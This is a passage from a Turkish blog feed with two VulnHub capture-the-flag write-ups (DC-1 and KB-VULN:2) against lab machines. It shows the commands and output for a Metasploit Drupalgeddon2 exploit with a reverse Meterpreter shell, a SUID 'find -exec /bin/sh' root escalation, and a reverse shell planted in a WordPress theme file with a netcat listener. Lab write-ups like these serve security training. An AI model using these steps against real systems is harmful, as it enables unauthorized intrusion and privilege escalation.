/node <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/profiles <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/README <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/robots <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/robots.txt <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/Root <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/scripts <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/search <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/Search <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/server-status <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/sites <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/themes <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/user <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/web.config <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/xmlrpc.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
2020/09/24 10:13:18 Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><p>Ä°lk olarak robots.txt dosyasÄ±na gÃ¶z gezdirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">User-agent: *
Crawl-delay: 10
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
</code></pre></div><p><strong>/?p=</strong> parametresi LFI, RFI aÃ§Ä±klarÄ±nÄ±n olabileceÄŸini dÃ¼ÅŸÃ¼ndÃ¼rmektedir. YapÄ±lan denemelerde baÅŸarÄ±lÄ± olunamamÄ±ÅŸtÄ±r. <em><strong>web.config</strong></em> dikkat Ã§ekmektedir. Ä°stek atÄ±ldÄ±ÄŸÄ±nda xml verisi gÃ¶rÃ¼lmektedir. LFI ve RFI gibi saldÄ±rÄ±larÄ± Ã¶nlemek iÃ§in epey bir Ã¶nlem alÄ±ndÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir. ğŸ˜”</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;configuration&gt;</span>
<span style="color:#f92672">&lt;system.webServer&gt;</span>
<span style="color:#75715e">&lt;!--
</span><span style="color:#75715e"> Don&#39;t show directory listings for URLs which map to a directory. 
</span><span style="color:#75715e">--&gt;</span>
<span style="color:#f92672">&lt;directoryBrowse</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;rewrite&gt;</span>
<span style="color:#f92672">&lt;rules&gt;</span>
<span style="color:#f92672">&lt;rule</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Protect files and directories from prying eyes&#34;</span> <span style="color:#a6e22e">stopProcessing=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;match</span> <span style="color:#a6e22e">url=</span><span style="color:#e6db74">&#34;\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)$|file*|Repository|Root|Tag|Template)$&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;CustomResponse&#34;</span> <span style="color:#a6e22e">statusCode=</span><span style="color:#e6db74">&#34;403&#34;</span> <span style="color:#a6e22e">subStatusCode=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">statusReason=</span><span style="color:#e6db74">&#34;Forbidden&#34;</span> <span style="color:#a6e22e">statusDescription=</span><span style="color:#e6db74">&#34;Access is forbidden.&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/rule&gt;</span>
<span style="color:#f92672">&lt;rule</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Force simple error message for requests for non-existent favicon.ico&#34;</span> <span style="color:#a6e22e">stopProcessing=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;match</span> <span style="color:#a6e22e">url=</span><span style="color:#e6db74">&#34;favicon\.ico&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;CustomResponse&#34;</span> <span style="color:#a6e22e">statusCode=</span><span style="color:#e6db74">&#34;404&#34;</span> <span style="color:#a6e22e">subStatusCode=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">statusReason=</span><span style="color:#e6db74">&#34;File Not Found&#34;</span> <span style="color:#a6e22e">statusDescription=</span><span style="color:#e6db74">&#34;The requested file favicon.ico was not found&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;conditions&gt;</span>
<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">input=</span><span style="color:#e6db74">&#34;{REQUEST_FILENAME}&#34;</span> <span style="color:#a6e22e">matchType=</span><span style="color:#e6db74">&#34;IsFile&#34;</span> <span style="color:#a6e22e">negate=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/conditions&gt;</span>
<span style="color:#f92672">&lt;/rule&gt;</span>
<span style="color:#75715e">&lt;!--
</span><span style="color:#75715e"> Rewrite URLs of the form &#39;x&#39; to the form &#39;index.php?q=x&#39;. 
</span><span style="color:#75715e">--&gt;</span>
<span style="color:#f92672">&lt;rule</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Short URLs&#34;</span> <span style="color:#a6e22e">stopProcessing=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;match</span> <span style="color:#a6e22e">url=</span><span style="color:#e6db74">&#34;^(.*)$&#34;</span> <span style="color:#a6e22e">ignoreCase=</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;conditions&gt;</span>
<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">input=</span><span style="color:#e6db74">&#34;{REQUEST_FILENAME}&#34;</span> <span style="color:#a6e22e">matchType=</span><span style="color:#e6db74">&#34;IsFile&#34;</span> <span style="color:#a6e22e">ignoreCase=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">negate=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">input=</span><span style="color:#e6db74">&#34;{REQUEST_FILENAME}&#34;</span> <span style="color:#a6e22e">matchType=</span><span style="color:#e6db74">&#34;IsDirectory&#34;</span> <span style="color:#a6e22e">ignoreCase=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">negate=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">input=</span><span style="color:#e6db74">&#34;{URL}&#34;</span> <span style="color:#a6e22e">pattern=</span><span style="color:#e6db74">&#34;^/favicon.ico$&#34;</span> <span style="color:#a6e22e">ignoreCase=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">negate=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/conditions&gt;</span>
<span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;Rewrite&#34;</span> <span style="color:#a6e22e">url=</span><span style="color:#e6db74">&#34;index.php?q={R:1}&#34;</span> <span style="color:#a6e22e">appendQueryString=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/rule&gt;</span>
<span style="color:#f92672">&lt;/rules&gt;</span>
<span style="color:#f92672">&lt;/rewrite&gt;</span>
<span style="color:#f92672">&lt;httpErrors&gt;</span>
<span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">statusCode=</span><span style="color:#e6db74">&#34;404&#34;</span> <span style="color:#a6e22e">subStatusCode=</span><span style="color:#e6db74">&#34;-1&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;error</span> <span style="color:#a6e22e">statusCode=</span><span style="color:#e6db74">&#34;404&#34;</span> <span style="color:#a6e22e">prefixLanguageFilePath=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;/index.php&#34;</span> <span style="color:#a6e22e">responseMode=</span><span style="color:#e6db74">&#34;ExecuteURL&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/httpErrors&gt;</span>
<span style="color:#f92672">&lt;defaultDocument&gt;</span>
<span style="color:#75715e">&lt;!-- Set the default document --&gt;</span>
<span style="color:#f92672">&lt;files&gt;</span>
<span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;index.php&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;index.php&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/files&gt;</span>
<span style="color:#f92672">&lt;/defaultDocument&gt;</span>
<span style="color:#f92672">&lt;/system.webServer&gt;</span>
<span style="color:#f92672">&lt;/configuration&gt;</span>
</code></pre></div><p>Google&rsquo;da yapÄ±lan aramalarda CMS sÃ¼rÃ¼mÃ¼nÃ¼n eski olduÄŸu tespit edilmiÅŸtir. YapÄ±lan aramalarda <em>CVE-2018-7600</em> kodlu &lsquo;Drupalgeddon2&rsquo; adÄ±nda  RCE (Remote Code Execution) exploiti tespit edilir.(Exploitdb de yer alan exploit indirilip kullanÄ±labilmektedir. Ben burada metasploit Ã¼zerinde exploit etme iÅŸlemi gerÃ§ekleÅŸtirdim.)</p>
<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -q
</code></pre></div><p>Metasploit aÃ§Ä±lÄ±r ve search komutu ile dropal ile ilgili arama gerÃ§ekleÅŸtirilir. AynÄ± exploit metasploit iÃ§erisinde yer almaktadÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; search drupal

Matching Modules
<span style="color:#f92672">================</span>

   <span style="color:#75715e">#  Name                                           Disclosure Date  Rank       Check  Description</span>
   -  ----                                           ---------------  ----       -----  -----------
   <span style="color:#ae81ff">0</span>  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   <span style="color:#ae81ff">1</span>  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   <span style="color:#ae81ff">2</span>  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   <span style="color:#ae81ff">3</span>  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   <span style="color:#ae81ff">4</span>  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon <span style="color:#ae81ff">2</span> Forms API Property Injection
   <span style="color:#ae81ff">5</span>  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   <span style="color:#ae81ff">6</span>  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize<span style="color:#f92672">()</span> RCE
   <span style="color:#ae81ff">7</span>  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">options <span style="color:#75715e">#exploit kullanÄ±mÄ± iÃ§in gerekli parametler gÃ¶rÃ¼ntÃ¼lenir</span>
set paramatre deÄŸer <span style="color:#75715e">#parametreye deÄŸer set edilir.</span>
exploit/run  <span style="color:#75715e">#exploit Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.</span>
</code></pre></div><p>DÃ¶rdÃ¼ncÃ¼ sÄ±rada yer alan exploit seÃ§ilir gerekli parametler ayarlamalar yapÄ±ldÄ±ktÄ±ndan sonra exploit/run komutu ile Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r ve meterpreter oturumu elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use <span style="color:#ae81ff">4</span>
msf5 exploit<span style="color:#f92672">(</span>unix/webapp/drupal_drupalgeddon2<span style="color:#f92672">)</span> &gt; set RHOSTS 192.168.56.107
RHOSTS <span style="color:#f92672">=</span>&gt; 192.168.56.107
msf5 exploit<span style="color:#f92672">(</span>unix/webapp/drupal_drupalgeddon2<span style="color:#f92672">)</span> &gt; exploit

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.56.105:4444 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">38288</span> bytes<span style="color:#f92672">)</span> to 192.168.56.107
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.56.105:4444 -&gt; 192.168.56.107:40386<span style="color:#f92672">)</span> at 2020-09-24 12:16:50 -0500
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getuid
Server username: www-data <span style="color:#f92672">(</span>33<span style="color:#f92672">)</span>

meterpreter &gt; ls
Listing: /var/www
<span style="color:#f92672">=================</span>

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  <span style="color:#ae81ff">174</span>    fil   2013-11-20 14:45:59 -0600  .gitignore
100644/rw-r--r--  <span style="color:#ae81ff">5767</span>   fil   2013-11-20 14:45:59 -0600  .htaccess
100644/rw-r--r--  <span style="color:#ae81ff">1481</span>   fil   2013-11-20 14:45:59 -0600  COPYRIGHT.txt
100644/rw-r--r--  <span style="color:#ae81ff">1451</span>   fil   2013-11-20 14:45:59 -0600  INSTALL.mysql.txt
100644/rw-r--r--  <span style="color:#ae81ff">1874</span>   fil   2013-11-20 14:45:59 -0600  INSTALL.pgsql.txt
100644/rw-r--r--  <span style="color:#ae81ff">1298</span>   fil   2013-11-20 14:45:59 -0600  INSTALL.sqlite.txt
100644/rw-r--r--  <span style="color:#ae81ff">17861</span>  fil   2013-11-20 14:45:59 -0600  INSTALL.txt
100755/rwxr-xr-x  <span style="color:#ae81ff">18092</span>  fil   2013-11-01 05:14:15 -0500  LICENSE.txt
100644/rw-r--r--  <span style="color:#ae81ff">8191</span>   fil   2013-11-20 14:45:59 -0600  MAINTAINERS.txt
100644/rw-r--r--  <span style="color:#ae81ff">5376</span>   fil   2013-11-20 14:45:59 -0600  README.txt
100644/rw-r--r--  <span style="color:#ae81ff">9642</span>   fil   2013-11-20 14:45:59 -0600  UPGRADE.txt
100644/rw-r--r--  <span style="color:#ae81ff">6604</span>   fil   2013-11-20 14:45:59 -0600  authorize.php
100644/rw-r--r--  <span style="color:#ae81ff">720</span>    fil   2013-11-20 14:45:59 -0600  cron.php
100644/rw-r--r--  <span style="color:#ae81ff">52</span>     fil   2019-02-19 07:20:46 -0600  flag1.txt
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  includes
100644/rw-r--r--  <span style="color:#ae81ff">529</span>    fil   2013-11-20 14:45:59 -0600  index.php
100644/rw-r--r--  <span style="color:#ae81ff">703</span>    fil   2013-11-20 14:45:59 -0600  install.php
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  misc
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  modules
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  profiles
100644/rw-r--r--  <span style="color:#ae81ff">1561</span>   fil   2013-11-20 14:45:59 -0600  robots.txt
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  scripts
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  sites
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  themes
100644/rw-r--r--  <span style="color:#ae81ff">19941</span>  fil   2013-11-20 14:45:59 -0600  update.php
100644/rw-r--r--  <span style="color:#ae81ff">2178</span>   fil   2013-11-20 14:45:59 -0600  web.config
100644/rw-r--r--  <span style="color:#ae81ff">417</span>    fil   2013-11-20 14:45:59 -0600  xmlrpc.php
</code></pre></div><p><code>shell</code> komutu ile normal oturuma geÃ§ilir. Daha sonra interaktif oturum iÃ§in python pty modulÃ¼ kullanÄ±lÄ±r. Daha sonra flag1.txt okunur. <em>(Meterpreter oturumu ile devam edilebilir ben kullanmayÄ± sevmediÄŸimden normal shelle geÃ§iyorum.)</em></p>

    <img src="/images/vulnhub/dc1/flag1.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


<p>Home dizinine geÃ§ilerek diÄŸer kullanÄ±lar tespit edilir. Flag4 adÄ±nda bir kullanÄ±cÄ± dizini yer almaktadÄ±r. Dizin yetkilerine bakÄ±ldÄ±ÄŸÄ±nda tÃ¼m kullanÄ±cÄ±lar iÃ§in okuma ve Ã§alÄ±ÅŸtÄ±rma yetkileri bulunmaktadÄ±r.</p>

    <img src="/images/vulnhub/dc1/flag43.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


<p>Dizin iÃ§erisinde yer alan flag4.txt okunur.</p>

    <img src="/images/vulnhub/dc1/flag44.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Sistem suid biti aktif olan dosyalar iÃ§in arama yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@DC-1:/$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null

/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
www-data@DC-1:/$ 
</code></pre></div><p>find komutu dikkat Ã§ekmektedir. find komutu -exec parametresi ile komut Ã§alÄ±ÅŸtÄ±rabilmektedir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find . -exec /bin/sh <span style="color:#ae81ff">\;</span> -quit
</code></pre></div><p>Komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra www-data kullanÄ±cÄ±sÄ±nÄ±n efektif user id deÄŸeri ve grubunun root olarak set edildiÄŸi gÃ¶rÃ¼lmektedir. Daha sonra /root dizinine gidilerek flag edeÄŸi okunarak makina Ã§Ã¶zÃ¼mlemesi tamamlanÄ±r.</p>

    <img src="/images/vulnhub/dc1/flagson.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULN KB VULN:2 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vuln-kb-vuln2-write-up/</link>
            <pubDate>Fri, 25 Sep 2020 20:01:07 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vuln-kb-vuln2-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere VULNHUB &amp;lsquo;da yer alan KB-VULN: 2 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Makina iÃ§in KernelBlog ekibine teÅŸekkÃ¼r ederim. Keyifli okumalar&amp;hellip;
1. KeÅŸif AÅŸamasÄ± Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.
netdiscover -i eth0  Ip adresi tespit edildikten sonra nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazÄ±mda sizlere <a href="https://www.vulnhub.com/entry/kb-vuln-2,562/">VULNHUB</a> &lsquo;da yer alan KB-VULN: 2 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Makina iÃ§in <a href="https://kernelblog.org">KernelBlog</a> ekibine teÅŸekkÃ¼r ederim. Keyifli okumalar&hellip;</p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth0
</code></pre></div>
    <img src="/images/vulnhub/kb-vuln2/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ip adresi tespit edildikten sonra nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.</p>

    <img src="/images/vulnhub/kb-vuln2/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>TarayÄ±cÄ± ile istek atÄ±ldÄ±ÄŸÄ±nda Apache Web server varsayÄ±lan sayfasÄ± aÃ§Ä±lmaktadÄ±r. Web dizin taramasÄ± gerÃ§ekleÅŸtirilir.</p>
<pre><code class="language-terminal" data-lang="terminal">gobuster dir -u http://192.168.56.108/ -w /usr/share/wordlists/dirb/big.txt
</code></pre>
    <img src="/images/vulnhub/kb-vuln2/gobuster.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><em><strong>/wordpress</strong></em> dizinine istek atÄ±dÄ±ÄŸÄ±nda anasayfanÄ±n dÃ¼zgÃ¼n gÃ¶rÃ¼ntÃ¼lenmediÄŸi tespit edilir. /etc/hosts dosyasÄ±na <code>192.168.56.108  kb.vuln</code> eklenir ve yenilenir. Sayfa kaynak kodlarÄ± incelenir. Herhangi bir bilgiye rastlanmaz.</p>

    <img src="/images/vulnhub/kb-vuln2/webpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Daha sonra Wordpress CMS dizininde tarama gerÃ§ekleÅŸtirilir. Standart wordpress dosyalarÄ± dÄ±ÅŸÄ±nda ilave bir bilgi gÃ¶rÃ¼lmemektedir.</p>
<pre><code class="language-terminal" data-lang="terminal">gobuster dir -u http://192.168.56.108/wordpress -w /usr/share/wordlists/dirb/big.txt
</code></pre>
    <img src="/images/vulnhub/kb-vuln2/gobuster2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Nmap taramasÄ±nda tespit edilen 445 ve 139 numaralÄ± portlarda Ã§alÄ±ÅŸan samba uygulamasÄ± iÃ§in (SMB Servisi) iÃ§in <em><strong>smbclient</strong></em> adlÄ± yazÄ±lÄ±m ile enumeration yapÄ±lÄ±r.</p>
<pre><code class="language-terminal" data-lang="terminal">smbclient -L ///192.168.56.108
# -L parametresi aÄŸda paylaÅŸÄ±lan dosylarÄ± listeler
# Username '', Password '' (Anonim EriÅŸim)
</code></pre>
    <img src="/images/vulnhub/kb-vuln2/smb1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Anonymous adlÄ± klasÃ¶re ÅŸifresiz eriÅŸim saÄŸlanabilmektedir. AyrÄ±ca Linux makinalarda samba servisine <em><strong>enum4linux</strong></em> aracÄ± ile tarama iÅŸlemi gerÃ§ekleÅŸtirilebilmektedir. EriÅŸime aÃ§Ä±k olan klasÃ¶re baÄŸlantÄ± saÄŸlanÄ±r. ls komutu ile dizin listelenir.</p>
<pre><code class="language-terminal" data-lang="terminal">smbclient \\\\192.168.56.108\\Anonymous
</code></pre>
    <img src="/images/vulnhub/kb-vuln2/smb2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Bir yedek dosyasÄ±nÄ±n ÅŸifresiz bir ÅŸekilde paylaÅŸÄ±ma aÃ§Ä±ldÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir. Dosya get komutu ile indirilir ve arÅŸiv dosyasÄ± aÃ§Ä±lÄ±r. Dosya iÃ§erisinde Ã§alÄ±ÅŸan wordpress uygulmasÄ±na ait dosyalar ve bir adet remember_me.txt dosya yer almaktadÄ±r.</p>

    <img src="/images/vulnhub/kb-vuln2/pass.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Admin kullanÄ±cÄ±sÄ±na ait parola bilgisi gÃ¶rÃ¼lmektedir. Wordpress admin paneline giriÅŸ yapÄ±lÄ±r. Daha sonra shell baÄŸlantÄ±sÄ± yapmak iÃ§in tema dosyalarÄ±nda dÃ¼zenleme yapÄ±lÄ±r. Bu iÅŸlem iÃ§in <em><strong>Appearance -&gt; Theme Editor</strong></em> sekmeleri tÄ±klanÄ±r. AÃ§Ä±lan sayfada tema secilir. SaÄŸ sÃ¼tunda php sayfalarÄ± yer almaktadÄ±r. Ben genelde 404.php dosyasÄ±nda deÄŸiÅŸiklik yapmaktayÄ±m.</p>

    <img src="/images/vulnhub/kb-vuln2/shell.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<pre><code class="language-url" data-lang="url">http://kb.vuln/wordpress/wp-content/themes/twentynineteen/404.php
</code></pre><p>Netcat ile 4444 numaralÄ± port dinlenir. YukarÄ±da yer alan adrese istek atÄ±ldÄ±ÄŸÄ±nda <strong>www-data</strong> kullanÄ±cÄ±sÄ± ile terminal baÄŸlantÄ±sÄ± saÄŸlanmÄ±ÅŸ olur.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><p>Komutu ile interaktif shelle geÃ§ilir. Home dizinine gidilerek kullanÄ±cÄ±lar listelenir.</p>

    <img src="/images/vulnhub/kb-vuln2/home.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>Kbadmin</strong> klasÃ¶r yetkilerine dikkat edildiÄŸinde tÃ¼m kullanÄ±cÄ±lar tarafÄ±nda okuma ve Ã§alÄ±ÅŸtÄ±rma yetkisi verildiÄŸi gÃ¶rÃ¼lmektedir. Dizin iÃ§erisine girilir.</p>

